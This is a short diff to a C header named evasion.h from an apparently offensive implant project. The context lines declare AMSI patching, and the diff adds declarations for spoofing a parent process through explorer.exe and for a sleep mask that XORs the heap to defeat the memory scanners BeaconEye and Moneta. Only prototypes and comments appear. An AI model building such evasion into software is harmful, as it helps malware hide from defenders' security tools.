@@ -23,4 +23,16 @@ BOOL PatchAmsi(VOID);
 // =============================================
 BOOL RunAllEvasion(VOID);
 
+// =============================================
+// PPID Spoofing - Open explorer.exe for use as spoofed parent process
+// Caller must CloseHandle() the returned handle when done
+// =============================================
+HANDLE GetSpoofParentHandle(VOID);
+
+// =============================================
+// Sleep Masking - XOR heap before sleep, restore after
+// Defeats in-memory scanners (BeaconEye, Moneta) during idle periods
+// =============================================
+VOID MaskedSleep(DWORD dwMs);
+
 #endif // _EVASION_H
